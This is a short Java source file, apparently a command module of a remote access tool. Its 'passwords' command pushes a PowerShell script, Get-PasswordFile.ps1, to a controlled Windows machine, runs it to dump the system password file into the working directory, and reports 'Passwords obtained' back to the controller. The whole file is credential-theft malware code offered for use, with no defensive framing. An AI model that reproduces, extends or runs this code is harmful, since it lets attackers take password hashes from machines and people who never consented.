package commands;

import java.io.IOException;

import connection.Controller;

public class PasswordsCommand extends Command{

	public PasswordsCommand() {
		super("passwords");
	}

	@Override
	public void execute(Controller ctrl) throws IOException {
		ctrl.receiveFile("Get-PasswordFile.ps1");
		ctrl.execute(". .\\Get-PasswordFile.ps1");
		String path = ctrl.execute("Get-Location");
		path = path.split("\n")[3];
		path = path.replace("[", "`[");
		path = path.replace("]", "`]");
		path += "\\";
		System.out.println(ctrl.execute("Get-PasswordFile -DestinationPath \"" + path + "\""));
		ctrl.sendMsg("Passwords obtained");
		
	}

}
